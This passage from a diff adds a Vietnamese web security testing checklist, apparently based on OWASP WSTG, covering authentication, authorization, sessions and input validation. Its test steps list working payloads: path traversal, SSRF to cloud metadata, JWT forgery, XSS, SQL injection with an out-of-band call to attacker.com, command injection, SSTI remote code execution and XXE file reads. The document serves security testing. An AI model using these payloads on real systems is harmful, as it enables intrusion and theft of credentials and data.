+          "Kiểm tra response time (timing attack): username hợp lệ thường tốn nhiều thời gian hơn do server còn check password",
+          "Kiểm tra status code: 200 vs 404, 401 vs 403",
+          "Phát hiện qua header sai khác hoặc redirect URL khác"
+        ],
+        tools:["Burp Suite Comparer","Burp Intruder","ffuf"]
+      },
+      {
+        id:"IDNT-005", sev:"low", title:"Kiểm thử chính sách username yếu",
+        desc:"Username quá đơn giản (số tuần tự, dễ đoán), không có giới hạn ký tự đặc biệt có thể gây XSS lưu trữ, hoặc collision (Unicode normalization).",
+        steps:[
+          "Thử username chứa: HTML, JS, SQL: <code>&lt;script&gt;</code>, <code>admin' OR '1'='1</code>, <code>../../../etc/passwd</code>",
+          "Kiểm tra Unicode normalization: <code>admin</code> vs <code>аdmin</code> (chữ a Cyrillic)",
+          "Thử khoảng trắng đầu/cuối: <code>\" admin\"</code>",
+          "Username phân biệt hoa thường nhất quán không? <code>Admin</code> và <code>admin</code> có thể là 2 user khác nhau hay không?"
+        ],
+        tools:["Burp Suite","manual testing"]
+      }
+    ]
+  },
+  {
+    id:"authn",
+    code:"WSTG-ATHN",
+    title:"4. Kiểm thử xác thực (Authentication)",
+    desc:"Authentication xác minh danh tính (\"Bạn là ai?\"). Lỗ hổng authentication mở đường cho account takeover — một trong những thiệt hại lớn nhất. Cần kiểm tra: chính sách mật khẩu, brute force protection, multi-factor, lockout, remember me, quên mật khẩu, đường truyền credential.",
+    items:[
+      {
+        id:"ATHN-001", sev:"critical", title:"Truyền credential qua kênh mã hóa (HTTPS)",
+        desc:"Toàn bộ giao tiếp chứa credential (login, change password, token reset) PHẢI qua HTTPS. Nếu qua HTTP, attacker MITM có thể đánh cắp credential dễ dàng.",
+        steps:[
+          "Kiểm tra form login submit qua HTTPS: <code>action=\"https://...\"</code>",
+          "Kiểm tra HTTP có bị redirect 301 sang HTTPS không",
+          "Kiểm tra form login load qua HTTPS (không HTTP, vì attacker có thể inject vào trang HTTP để đổi action)",
+          "Kiểm tra HSTS đã được bật (xem CONF-006)",
+          "Đảm bảo cookie session có flag <code>Secure</code>"
+        ],
+        tools:["curl","Burp Suite","sslyze","testssl.sh"]
+      },
+      {
+        id:"ATHN-002", sev:"high", title:"Kiểm thử credential mặc định",
+        desc:"Tài khoản mặc định của framework, CMS, thiết bị thường không bị đổi. Đây là cách xâm nhập dễ nhất.",
+        steps:[
+          "Thử admin/admin, admin/password, admin/123456, root/root, administrator/administrator",
+          "Sử dụng wordlist chuyên dụng: SecLists/Passwords/Default-Credentials/",
+          "Kiểm tra credential mặc định cho service: Tomcat (tomcat/tomcat), Jenkins (admin/admin), Jboss, Weblogic",
+          "Kiểm tra trang test/staging có credential trong source code/comment không"
+        ],
+        tools:["hydra","medusa","SecLists","cewl"]
+      },
+      {
+        id:"ATHN-003", sev:"high", title:"Kiểm thử cơ chế khóa tài khoản (Account Lockout)",
+        desc:"Không có lockout sau N lần sai → cho phép brute force vô hạn. Lockout quá lỏng (vd: chỉ check IP) cũng có thể bypass. Lockout quá chặt → DoS user hợp lệ.",
+        steps:[
+          "Đăng nhập sai liên tục N lần (5, 10, 20) — có bị khóa không?",
+          "Sau khi khóa, thử bypass: đổi IP, dùng X-Forwarded-For, thay đổi User-Agent, đổi case username",
+          "Có khóa theo username (đúng) hay theo IP (có thể bypass bằng IP rotation)?",
+          "Có CAPTCHA sau N lần sai không?",
+          "Khi khóa, attacker có thể \"reset\" bằng cách quên mật khẩu rồi đăng nhập lại không?",
+          "Quan sát response time có thay đổi sau N lần sai không (rate limit ngầm)"
+        ],
+        tools:["Burp Intruder","hydra","ffuf"]
+      },
+      {
+        id:"ATHN-004", sev:"high", title:"Kiểm thử bypass schema xác thực",
+        desc:"Cố gắng truy cập tài nguyên cần xác thực mà không qua quy trình đăng nhập. Bao gồm: forced browsing, parameter manipulation, session ID prediction.",
+        steps:[
+          "Truy cập trực tiếp URL nội bộ: <code>/admin/dashboard</code>, <code>/api/users/me</code> mà không có cookie/token",
+          "Sửa parameter: <code>?authenticated=1</code>, <code>?role=admin</code>, <code>?bypass=true</code>",
+          "Sửa cookie: thử các giá trị logic <code>isLoggedIn=true</code>, <code>admin=1</code>",
+          "Truy cập với HTTP method khác: GET → POST, POST → PUT",
+          "Bypass qua header: <code>X-Original-URL</code>, <code>X-Rewrite-URL</code>, <code>X-Forwarded-For</code>"
+        ],
+        tools:["Burp Suite","curl","ffuf"]
+      },
+      {
+        id:"ATHN-005", sev:"medium", title:"Kiểm thử ghi nhớ mật khẩu (Remember Me)",
+        desc:"Tính năng \"Nhớ tôi\" thường implement bằng cookie persistent. Nếu cookie chứa thông tin nhạy cảm chưa mã hóa, hoặc dễ đoán/predict, attacker có thể giả mạo.",
+        steps:[
+          "Phân tích cấu trúc cookie remember-me: có chứa username, password, hash gì",
+          "Cookie có expire phù hợp không (thường 30 ngày)",
+          "Cookie có flag <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> không",
+          "Có thể decode/predict được token không (base64 → plain, hoặc UUID v1 dự đoán theo timestamp)",
+          "Khi user đổi mật khẩu, cookie remember-me cũ có bị invalidate không"
+        ],
+        tools:["Burp Suite","jwt.io"]
+      },
+      {
+        id:"ATHN-006", sev:"medium", title:"Kiểm thử bộ nhớ đệm trình duyệt cho dữ liệu nhạy cảm",
+        desc:"Browser cache có thể lưu trang chứa dữ liệu nhạy cảm (số tài khoản, lịch sử giao dịch). Trên máy dùng chung, người sau có thể xem lại bằng nút Back hoặc cache.",
+        steps:[
+          "Đăng nhập, xem trang nhạy cảm, đăng xuất, nhấn nút Back — trang có hiện lại không?",
+          "Kiểm tra header: <code>Cache-Control: no-store, no-cache, must-revalidate, private</code>",
+          "Header <code>Pragma: no-cache</code> và <code>Expires: 0</code>",
+          "Form input mật khẩu có <code>autocomplete=\"off\"</code> không (cho input nhạy cảm)"
+        ],
+        tools:["browser DevTools","Burp Suite"]
+      },
+      {
+        id:"ATHN-007", sev:"high", title:"Kiểm thử chính sách mật khẩu",
+        desc:"Đánh giá chính sách độ phức tạp mật khẩu: độ dài tối thiểu, ký tự đặc biệt, kiểm tra mật khẩu phổ biến, lịch sử mật khẩu, thời hạn, thông báo lỗi không lộ thông tin.",
+        steps:[
+          "Thử đăng ký/đổi mật khẩu với: 1 ký tự, 100 ký tự, chỉ số, chỉ chữ thường, mật khẩu phổ biến (123456, password, qwerty)",
+          "Kiểm tra mật khẩu có check với danh sách HaveIBeenPwned không",
+          "Có cấm mật khẩu chứa username không?",
+          "Có lưu lịch sử N mật khẩu cũ không cho dùng lại?",
+          "Tối đa độ dài mật khẩu (DoS risk nếu cho phép quá dài → bcrypt sẽ chậm)",
+          "Hỗ trợ Unicode/emoji trong mật khẩu không?"
+        ],
+        tools:["Burp Suite","manual testing","HaveIBeenPwned API"]
+      },
+      {
+        id:"ATHN-008", sev:"critical", title:"Kiểm thử câu hỏi bảo mật yếu",
+        desc:"Câu hỏi bảo mật như \"Tên thú cưng đầu tiên\", \"Trường tiểu học\" thường có thể tìm trên mạng xã hội. Nếu đây là yếu tố duy nhất reset mật khẩu, attacker dễ chiếm tài khoản.",
+        steps:[
+          "Liệt kê các câu hỏi có sẵn — có quá đơn giản không (yes/no, màu yêu thích)?",
+          "User có thể tự nhập câu hỏi (custom) không và có check chất lượng không?",
+          "Có brute force được câu trả lời không (lockout)?",
+          "Câu trả lời có case-sensitive không, có normalize không?"
+        ],
+        tools:["Burp Intruder","manual testing"]
+      },
+      {
+        id:"ATHN-009", sev:"critical", title:"Kiểm thử quy trình quên/đổi mật khẩu",
+        desc:"Quy trình reset mật khẩu là target hàng đầu cho account takeover. Cần kiểm tra: token reset có entropy đủ, có expire, dùng 1 lần, gắn với user, không leak qua referer, host header injection.",
+        steps:[
+          "Phân tích token reset: dài, ngẫu nhiên, không predict được",
+          "Token có expire không (15 phút - 1 giờ là hợp lý)",
+          "Token có dùng 1 lần (one-time use) không",
+          "Khi đổi mật khẩu thành công, các session khác có bị invalidate không",
+          "Host header injection: thay <code>Host: target.com</code> bằng <code>Host: evil.com</code> → email reset có dùng evil.com không?",
+          "Kiểm tra rò rỉ qua Referer header khi user click link",
+          "Có thể dùng token của user A để reset cho user B không (IDOR)?",
+          "Khi đổi mật khẩu (đã đăng nhập), có yêu cầu mật khẩu cũ không"
+        ],
+        tools:["Burp Suite","Burp Collaborator"]
+      },
+      {
+        id:"ATHN-010", sev:"high", title:"Kiểm thử kênh phụ xác thực (Auxiliary Channel)",
+        desc:"Một số ứng dụng có nhiều cách đăng nhập: web, mobile API, SSO, OAuth, SAML, legacy interface. Mỗi kênh có thể có policy khác nhau — kênh yếu nhất quyết định an ninh.",
+        steps:[
+          "Liệt kê tất cả endpoint authentication: web login, mobile API login, SSO, OAuth callback",
+          "Mobile API có lockout không, có CAPTCHA không?",
+          "SSO bypass: thử nhập credential local thay vì SSO",
+          "Legacy endpoint cũ: <code>/old-login</code>, <code>/api/v1/login</code> có còn hoạt động và có chính sách lỏng hơn không"
+        ],
+        tools:["Burp Suite","mobile testing tools"]
+      },
+      {
+        id:"ATHN-011", sev:"critical", title:"Kiểm thử Multi-Factor Authentication (MFA/2FA)",
+        desc:"MFA là lớp bảo vệ quan trọng. Cần kiểm tra: bypass MFA, brute force OTP, rate limit, tái sử dụng OTP, leak OTP qua response, downgrade attack.",
+        steps:[
+          "Kiểm tra response sau khi nhập username/password đúng — có leak token nhạy cảm trước khi nhập OTP không",
+          "Bỏ qua bước OTP: gọi trực tiếp endpoint sau OTP với cookie sau bước 1",
+          "Brute force OTP 6 số: có rate limit không (10⁶ = 1M, thường brute trong vài phút nếu không limit)",
+          "OTP có expire không (thường 30s-5 phút)",
+          "OTP có dùng 1 lần không, hay có thể submit nhiều lần",
+          "Response code/message khác nhau giữa OTP đúng và sai → enumerate",
+          "Có thể downgrade về single-factor không (xóa header MFA, đổi loại MFA)",
+          "Backup code có entropy cao và bị invalidate sau dùng không",
+          "Race condition: gửi nhiều request OTP cùng lúc"
+        ],
+        tools:["Burp Intruder","Turbo Intruder"]
+      }
+    ]
+  },
+  {
+    id:"authz",
+    code:"WSTG-ATHZ",
+    title:"5. Kiểm thử phân quyền (Authorization)",
+    desc:"Authorization xác định \"Bạn được phép làm gì?\" sau khi đã xác thực. Lỗ hổng phân quyền (IDOR, privilege escalation, path traversal) là loại phổ biến và nguy hiểm nhất theo OWASP Top 10 2021 (A01: Broken Access Control).",
+    items:[
+      {
+        id:"ATHZ-001", sev:"critical", title:"Kiểm thử Path Traversal / Directory Traversal",
+        desc:"Lỗ hổng cho phép attacker đọc/ghi file ngoài thư mục dự kiến bằng cách inject ký tự traversal (<code>../</code>) vào parameter file/path. Có thể dẫn đến đọc file cấu hình (/etc/passwd, web.config), source code, log nhạy cảm.",
+        steps:[
+          "Tìm parameter nhận file/path: <code>?file=</code>, <code>?page=</code>, <code>?include=</code>, <code>?template=</code>, <code>?download=</code>",
+          "Thử payload cơ bản: <code>../../../../etc/passwd</code>, <code>..\\..\\..\\windows\\win.ini</code>",
+          "URL encoding: <code>%2e%2e%2f</code>, double encoding <code>%252e%252e%252f</code>",
+          "Bypass filter: <code>....//</code>, <code>..%c0%af</code>, <code>..%252f</code>",
+          "Null byte (PHP cũ): <code>../../etc/passwd%00.jpg</code>",
+          "Absolute path: <code>/etc/passwd</code>, <code>file:///etc/passwd</code>",
+          "Thử đọc file đặc trưng: <code>/proc/self/environ</code>, <code>/var/log/apache2/access.log</code>"
+        ],
+        tools:["Burp Suite","DotDotPwn","ffuf","fimap"]
+      },
+      {
+        id:"ATHZ-002", sev:"critical", title:"Kiểm thử bypass schema phân quyền",
+        desc:"Sau khi liệt kê đầy đủ chức năng theo từng role, kiểm tra xem user role thấp có thể truy cập chức năng của role cao không. Bao gồm horizontal (cùng cấp) và vertical (lên cấp) escalation.",
+        steps:[
+          "Tạo 2 tài khoản: admin và user thường",
+          "Ghi lại tất cả request admin (Burp logger)",
+          "Replay từng request với cookie/token của user thường — có thực thi được không?",
+          "Sửa request POST đổi role: <code>{\"userId\":123,\"role\":\"admin\"}</code>",
+          "Kiểm tra qua HTTP method: chức năng admin có thể gọi qua GET thay vì POST không (có thể bỏ qua middleware check)",
+          "Thử URL alias: <code>/admin/users</code> vs <code>/api/admin/users</code> vs <code>/v2/admin/users</code>"
+        ],
+        tools:["Burp Suite Autorize","AuthMatrix","ZAP"]
+      },
+      {
+        id:"ATHZ-003", sev:"critical", title:"Kiểm thử leo thang đặc quyền (Privilege Escalation)",
+        desc:"User thường có thể trở thành admin qua: mass assignment, edit profile (sửa role field), endpoint không kiểm tra role, race condition khi gán role.",
+        steps:[
+          "Trong endpoint update profile, thêm field <code>role=admin</code>, <code>isAdmin=true</code>, <code>permissions=[\"*\"]</code>",
+          "Tạo invitation/sub-user với role cao hơn role hiện tại",
+          "Race condition: gửi đồng thời \"upgrade plan\" và \"thanh toán\" để được upgrade mà không trả tiền",
+          "Token JWT: sửa role trong payload (nếu chữ ký yếu hoặc <code>alg:none</code>)",
+          "GraphQL: gọi mutation <code>updateUserRole</code> với chính tài khoản mình"
+        ],
+        tools:["Burp Suite","Turbo Intruder","jwt_tool"]
+      },
+      {
+        id:"ATHZ-004", sev:"critical", title:"Kiểm thử Insecure Direct Object Reference (IDOR)",
+        desc:"IDOR xảy ra khi server tin tưởng ID do client gửi mà không kiểm tra ownership. Ví dụ: <code>/api/orders/12345</code> — user A có thể xem order của user B chỉ bằng cách đổi ID. Đây là lỗ hổng cực phổ biến trong API.",
+        steps:[
+          "Tạo 2 tài khoản A và B, mỗi tài khoản tạo resource (order, message, document)",
+          "Đăng nhập A, thay ID resource của A bằng ID của B trong URL/body — có truy cập được không?",
+          "Thử với mọi action: GET (xem), PUT/PATCH (sửa), DELETE (xóa)",
+          "ID không phải số: thử guess UUID (UUID v1 có thể predict), base64 encode (decode để xem là ID gì)",
+          "Indirect reference: tham số <code>filename</code>, <code>email</code>, <code>username</code> cũng có thể IDOR",
+          "Nested resource: <code>/users/123/orders/456</code> — đổi 123 hay 456 đều có thể có lỗ hổng",
+          "GraphQL: query <code>user(id:2){email,phone}</code>"
+        ],
+        tools:["Burp Suite","Autorize","ffuf","Param Miner"]
+      },
+      {
+        id:"ATHZ-005", sev:"high", title:"Kiểm thử quyền truy cập file (File Permissions)",
+        desc:"File upload bởi user A có thể bị user B truy cập trực tiếp qua URL không? Có liệt kê được toàn bộ file upload không?",
+        steps:[
+          "Upload file (private), lấy URL → đăng nhập user khác → truy cập URL — có chặn không?",
+          "Tên file có dễ đoán không (sequential number, timestamp)?",
+          "Thư mục upload có liệt kê được không (directory listing)?",
+          "Có thể truy cập file của user khác qua thay ID/path không?"
+        ],
+        tools:["Burp Suite","gobuster"]
+      },
+      {
+        id:"ATHZ-006", sev:"critical", title:"Kiểm thử Server-Side Request Forgery (SSRF)",
+        desc:"SSRF cho phép attacker buộc server gửi request đến địa chỉ nội bộ (internal IP, cloud metadata service). Hậu quả: truy cập service nội bộ không có authentication, lấy IAM credential từ AWS metadata (169.254.169.254), port scanning từ phía server.",
+        steps:[
+          "Tìm parameter nhận URL: avatar URL, webhook, image proxy, PDF render, link preview, OAuth callback",
+          "Thử URL nội bộ: <code>http://127.0.0.1</code>, <code>http://localhost:8080</code>, <code>http://192.168.1.1</code>",
+          "AWS metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>",
+          "GCP metadata: <code>http://metadata.google.internal/computeMetadata/v1/</code>",
+          "Bypass filter: <code>http://[::]</code>, <code>http://0.0.0.0</code>, <code>http://0177.0.0.1</code> (octal), <code>http://2130706433</code> (decimal IP)",
+          "DNS rebinding: domain mà attacker control, lần resolve đầu trỏ public, sau đó trỏ 127.0.0.1",
+          "Protocol khác: <code>file://</code>, <code>gopher://</code>, <code>dict://</code>, <code>ftp://</code>",
+          "Blind SSRF: dùng Burp Collaborator để phát hiện request out-of-band"
+        ],
+        tools:["Burp Suite","Burp Collaborator","SSRFmap","Gopherus"]
+      },
+      {
+        id:"ATHZ-007", sev:"high", title:"Kiểm thử OAuth 2.0",
+        desc:"OAuth có nhiều bẫy bảo mật: redirect_uri validation lỏng, state parameter thiếu (CSRF), authorization code bị reuse, implicit flow trên mobile, scope leakage.",
+        steps:[
+          "Sửa <code>redirect_uri</code>: thử domain attacker, subdomain, path traversal, fragment, query bypass",
+          "Thiếu hoặc không kiểm tra <code>state</code> parameter → CSRF gắn tài khoản victim với attacker",
+          "Authorization code có dùng 1 lần và expire ngắn không?",
+          "Đổi <code>response_type=code</code> sang <code>response_type=token</code> → implicit flow",
+          "Đổi <code>scope</code> để xin nhiều quyền hơn",
+          "PKCE bị bỏ qua trên mobile/SPA?"
+        ],
+        tools:["Burp Suite","oauth-scanner"]
+      }
+    ]
+  },
+  {
+    id:"session",
+    code:"WSTG-SESS",
+    title:"6. Kiểm thử quản lý phiên (Session Management)",
+    desc:"Session liên kết các request từ một user đã xác thực. Lỗ hổng session (session fixation, hijacking, CSRF, weak session ID) cho phép attacker chiếm tài khoản mà không cần biết mật khẩu.",
+    items:[
+      {
+        id:"SESS-001", sev:"high", title:"Kiểm thử Session Management Schema",
+        desc:"Đánh giá tổng thể cơ chế session: cookie hay token, lưu ở đâu, scope, lifetime, regenerate khi login.",
+        steps:[
+          "Phân tích cookie session: tên, kích thước, encoding (base64, hex, JWT)",
+          "Cookie có flag <code>HttpOnly</code> (chống XSS đọc), <code>Secure</code> (chỉ qua HTTPS), <code>SameSite=Strict/Lax</code> (chống CSRF)?",
+          "Session ID có entropy đủ không (≥128 bits)?",
+          "Có predict được session ID kế tiếp không (sequential, timestamp-based)?",
+          "Session có regenerate ID sau login không (chống session fixation)?"
+        ],
+        tools:["Burp Suite Sequencer","Burp Suite","jwt.io"]
+      },
+      {
+        id:"SESS-002", sev:"high", title:"Kiểm thử thuộc tính cookie",
+        desc:"Cookie chứa session phải có các flag bảo mật. Thiếu flag mở đường cho XSS đánh cắp session, CSRF, MITM.",
+        steps:[
+          "<code>Secure</code>: chỉ gửi qua HTTPS — bắt buộc cho session/auth cookie",
+          "<code>HttpOnly</code>: JS không đọc được — chống XSS lấy cookie",
+          "<code>SameSite</code>: <code>Strict</code> chặt nhất, <code>Lax</code> mặc định, <code>None</code> phải kèm Secure",
+          "<code>Path</code>: scope càng hẹp càng tốt",
+          "<code>Domain</code>: không nên set quá rộng (vd: <code>.target.com</code> nếu không cần)",
+          "<code>Expires/Max-Age</code>: session cookie không nên có (sẽ thành persistent)",
+          "<code>__Host-</code> prefix: bắt buộc Secure, không có Domain, Path=/"
+        ],
+        tools:["browser DevTools","Burp Suite"]
+      },
+      {
+        id:"SESS-003", sev:"critical", title:"Kiểm thử Session Fixation",
+        desc:"Attacker set sẵn session ID cho victim (qua XSS, link), victim đăng nhập, attacker dùng session ID đó để chiếm phiên. Phòng chống: server PHẢI tạo session ID mới sau khi đăng nhập thành công.",
+        steps:[
+          "Lấy session ID khi chưa đăng nhập (anonymous)",
+          "Đăng nhập → so sánh session ID trước và sau đăng nhập — có đổi không?",
+          "Set session ID tùy ý qua URL/cookie → đăng nhập → server có chấp nhận session ID đó không"
+        ],
+        tools:["Burp Suite","manual testing"]
+      },
+      {
+        id:"SESS-004", sev:"high", title:"Kiểm thử lộ thông tin session",
+        desc:"Session ID không được xuất hiện trong URL, log, referer, error message. Nếu trong URL → log proxy/CDN/server lưu → leak.",
+        steps:[
+          "Kiểm tra session ID có trong URL không (query string, path)",
+          "Click external link → Referer header có chứa session không",
+          "Server log có ghi session ID không (cần xem cấu hình)",
+          "Access log của file static có lộ session ID không"
+        ],
+        tools:["Burp Suite","manual testing"]
+      },
+      {
+        id:"SESS-005", sev:"critical", title:"Kiểm thử CSRF (Cross-Site Request Forgery)",
+        desc:"CSRF lừa user đã đăng nhập thực hiện hành động ngoài ý muốn (chuyển tiền, đổi email). Phòng chống chính: anti-CSRF token, SameSite cookie, kiểm tra Origin/Referer.",
+        steps:[
+          "Tạo HTML page submit form đến endpoint nhạy cảm (đổi mật khẩu, chuyển tiền)",
+          "Mở page trên domain khác trong khi đang đăng nhập victim → có thực thi không?",
+          "Kiểm tra anti-CSRF token: có tồn tại, có verify, có gắn với session, có random",
+          "Bypass: xóa token, gửi token rỗng, dùng token của user khác, dùng token cũ",
+          "Đổi method: POST → GET (nếu accept cả 2)",
+          "Đổi Content-Type: <code>application/json</code> → <code>text/plain</code> (có thể bỏ qua check CORS preflight)",
+          "Kiểm tra SameSite cookie có set không"
+        ],
+        tools:["Burp Suite CSRF PoC generator","manual HTML"]
+      },
+      {
+        id:"SESS-006", sev:"high", title:"Kiểm thử chức năng Logout",
+        desc:"Logout phải invalidate session phía server, không chỉ xóa cookie phía client. Test bằng cách giữ lại session ID rồi replay sau khi logout.",
+        steps:[
+          "Đăng nhập → ghi lại cookie → logout → replay request với cookie cũ — có còn hoạt động không?",
+          "Logout có invalidate ALL session (mọi thiết bị) hay chỉ session hiện tại?",
+          "Đổi mật khẩu có invalidate session khác không?",
+          "Có nút logout ở mọi trang không (tránh shared computer)?",
+          "Logout có CSRF protection không (attacker force logout victim)"
+        ],
+        tools:["Burp Suite"]
+      },
+      {
+        id:"SESS-007", sev:"medium", title:"Kiểm thử Session Timeout",
+        desc:"Session phải tự hết hạn sau thời gian không hoạt động (idle timeout) và sau thời gian dài (absolute timeout). Quá lâu → cửa sổ tấn công lớn; quá ngắn → khó dùng.",
+        steps:[
+          "Idle timeout: để yên N phút (15-30 cho ngân hàng, 1-2h cho thông thường) → session còn không?",
+          "Absolute timeout: dù đang dùng, session vẫn nên expire sau 12-24h",
+          "Sau timeout, request tiếp theo có yêu cầu đăng nhập lại không?",
+          "Token JWT có exp claim ngắn không?"
+        ],
+        tools:["Burp Suite","manual testing"]
+      },
+      {
+        id:"SESS-008", sev:"high", title:"Kiểm thử puzzle JWT (JSON Web Token)",
+        desc:"JWT có nhiều bẫy: <code>alg:none</code> bypass chữ ký, weak secret brute force, algorithm confusion (RS256→HS256), không verify chữ ký.",
+        steps:[
+          "Decode JWT: <code>jwt.io</code> hoặc <code>jwt_tool token</code>",
+          "Thử <code>alg:none</code>: header <code>{\"alg\":\"none\",\"typ\":\"JWT\"}</code>, không signature",
+          "Brute force HS256 secret yếu: <code>jwt_tool token -C -d wordlist.txt</code>",
+          "Algorithm confusion RS256 → HS256: dùng public key làm secret HMAC",
+          "Sửa payload (role, user_id) — server có verify chữ ký không?",
+          "<code>kid</code> injection: thêm SQLi, path traversal vào header kid",
+          "<code>jku</code>/<code>x5u</code>: trỏ tới key của attacker",
+          "Token không có exp/expire quá lâu",
+          "Token sau logout có invalidate không (token blacklist)"
+        ],
+        tools:["jwt_tool","jwt.io","Burp Suite JWT Editor"]
+      }
+    ]
+  },
+  {
+    id:"input-validation",
+    code:"WSTG-INPV",
+    title:"7. Kiểm thử xác thực dữ liệu đầu vào (Input Validation)",
+    desc:"Phần lớn lỗ hổng web đến từ việc tin tưởng input từ user mà không validate/sanitize/escape. Bao gồm: XSS, SQL Injection, Command Injection, XXE, SSTI, LDAP injection, NoSQL injection. Đây là phần quan trọng nhất của kiểm thử web.",
+    items:[
+      {
+        id:"INPV-001", sev:"critical", title:"Reflected Cross-Site Scripting (XSS)",
+        desc:"XSS phản hồi: input đi vào response ngay lập tức (qua URL, query). Attacker tạo link độc, victim click → JS chạy trong context của victim. Hậu quả: đánh cắp cookie, keylog, phishing, redirect.",
+        steps:[
+          "Inject vào mọi parameter: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>",
+          "Quan sát context của reflection: HTML body, attribute (\"onmouseover=alert(1)\"), JS string ('-alert(1)-'), URL (javascript:alert(1))",
+          "Bypass filter: <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=alert(1)&gt;</code>",
+          "Encoding: HTML entity, URL encode, Unicode <code>\\u003c</code>, JS string concat",
+          "Bypass WAF: case mixing <code>&lt;ScRiPt&gt;</code>, comment <code>&lt;img/src=x/onerror=alert(1)&gt;</code>",
+          "Polyglot payload: <code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</code>",
+          "Trong context JSON/JSONP: thử break out khỏi string"
+        ],
+        tools:["Burp Suite","XSS Hunter","XSStrike","DalFox"]
+      },
+      {
+        id:"INPV-002", sev:"critical", title:"Stored Cross-Site Scripting (XSS)",
+        desc:"XSS lưu trữ: payload được lưu vào DB và hiển thị cho user khác (comment, profile, message). Tác động lớn vì tự động ảnh hưởng nhiều victim, không cần social engineering.",
+        steps:[
+          "Inject vào: tên hiển thị, bio, comment, message, file name, log entry, user-agent (nếu hiển thị trong admin)",
+          "Quan sát mọi trang hiển thị input đó (kể cả admin panel)",
+          "Test XSS qua upload: tên file, EXIF metadata, SVG file (chứa script)",
+          "Test cross-context: input nhập ở mobile, hiển thị ở web admin"
+        ],
+        tools:["Burp Suite","XSS Hunter","BeEF"]
+      },
+      {
+        id:"INPV-003", sev:"high", title:"DOM-based XSS",
+        desc:"XSS xảy ra hoàn toàn ở client-side: JS lấy dữ liệu từ source (location.hash, document.referrer) và đưa vào sink (innerHTML, eval). Server không thấy payload.",
+        steps:[
+          "Tìm source nguy hiểm trong JS: <code>location</code>, <code>document.URL</code>, <code>document.cookie</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>",
+          "Tìm sink: <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code> (string), <code>jQuery.html()</code>",
+          "Thử payload: <code>https://target.com/#&lt;img src=x onerror=alert(1)&gt;</code>",
+          "Sử dụng DOM Invader của Burp"
+        ],
+        tools:["Burp DOM Invader","Chrome DevTools","DOMPurify-bypass"]
+      },
+      {
+        id:"INPV-004", sev:"critical", title:"SQL Injection (SQLi)",
+        desc:"SQLi inject SQL vào query → đọc/sửa/xóa dữ liệu, đọc file (LOAD_FILE), thực thi lệnh hệ điều hành. Một trong những lỗ hổng nguy hiểm và phổ biến nhất.",
+        steps:[
+          "Thử ký tự đặc biệt: <code>'</code>, <code>\"</code>, <code>;</code>, <code>--</code>, <code>/*</code>",
+          "Error-based: <code>'</code> → quan sát lỗi SQL trong response",
+          "Boolean-based blind: <code>' AND 1=1--</code> vs <code>' AND 1=2--</code> → so sánh response",
+          "Time-based blind: <code>' AND SLEEP(5)--</code> (MySQL), <code>'; WAITFOR DELAY '0:0:5'--</code> (MSSQL)",
+          "UNION-based: <code>' UNION SELECT NULL,NULL,version()--</code>",
+          "Out-of-band (OOB): <code>'; EXEC master..xp_dirtree '\\\\attacker.com\\test'--</code>",
+          "Inject vào: GET, POST, Cookie, User-Agent, Referer, X-Forwarded-For (nếu được log)",
+          "Inject vào: ORDER BY, LIMIT, INSERT, UPDATE, DELETE, stored procedure",
+          "Bypass WAF: comment trong query <code>UN/**/ION SE/**/LECT</code>, encoding, case mixing",
+          "Second-order SQLi: payload lưu trong bước 1, thực thi ở bước 2"
+        ],
+        tools:["sqlmap","Burp Suite","NoSQLMap","ghauri"]
+      },
+      {
+        id:"INPV-005", sev:"high", title:"LDAP Injection",
+        desc:"Inject vào LDAP filter, có thể bypass authentication, leak thông tin AD/LDAP directory.",
+        steps:[
+          "Bypass login: username <code>*)(uid=*))(|(uid=*</code>, password <code>*</code>",
+          "Boolean blind: <code>*)(mail=admin@*</code>",
+          "Tìm dấu hiệu: search box trả kết quả khi nhập <code>*</code>"
+        ],
+        tools:["Burp Suite","ldap-search-injection-payloads"]
+      },
+      {
+        id:"INPV-006", sev:"critical", title:"OS Command Injection",
+        desc:"Inject lệnh shell vào ứng dụng gọi <code>system()</code>, <code>exec()</code>, <code>popen()</code> với input chưa lọc. Cho phép thực thi mã trên server.",
+        steps:[
+          "Tìm chức năng gọi command: ping, traceroute, nslookup, image converter, PDF generator, log search",
+          "Payload: <code>; id</code>, <code>| whoami</code>, <code>&& cat /etc/passwd</code>, <code>` id `</code>, <code>$(id)</code>",
+          "Windows: <code>& dir</code>, <code>| whoami</code>",
+          "Bypass space filter: <code>${IFS}</code>, <code>$IFS$9</code>, <code>{cat,/etc/passwd}</code>",
+          "Blind injection: dùng OAST (Burp Collaborator) — <code>; nslookup attacker.burpcollaborator.net</code>",
+          "Time-based blind: <code>; sleep 10</code>"
+        ],
+        tools:["Burp Suite","commix","Burp Collaborator"]
+      },
+      {
+        id:"INPV-007", sev:"high", title:"Server-Side Template Injection (SSTI)",
+        desc:"Khi ứng dụng nhúng input vào template engine (Jinja2, Twig, Velocity, Freemarker), attacker có thể inject template syntax → RCE.",
+        steps:[
+          "Test cơ bản: <code>{{7*7}}</code>, <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code>, <code>#{7*7}</code>",
+          "Quan sát kết quả 49 → có SSTI",
+          "Identify engine: <code>{{7*'7'}}</code> = 49 (Twig) hay 7777777 (Jinja2)",
+          "Jinja2 RCE: <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code>",
+          "Freemarker: <code>&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt;${ex(\"id\")}</code>",
+          "Test ở: email template, bio, error page, search box"
+        ],
+        tools:["tplmap","Burp Suite","SSTImap"]
+      },
+      {
+        id:"INPV-008", sev:"high", title:"XML External Entity (XXE)",
+        desc:"Khi parser XML không tắt external entity, attacker có thể đọc file local (<code>file:///</code>), gây SSRF, DoS (billion laughs), thậm chí RCE.",
+        steps:[
+          "Tìm endpoint nhận XML: SOAP, RSS, SVG upload, DOCX/XLSX upload, sitemap import",
+          "Đọc file: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;data&gt;&xxe;&lt;/data&gt;</code>",
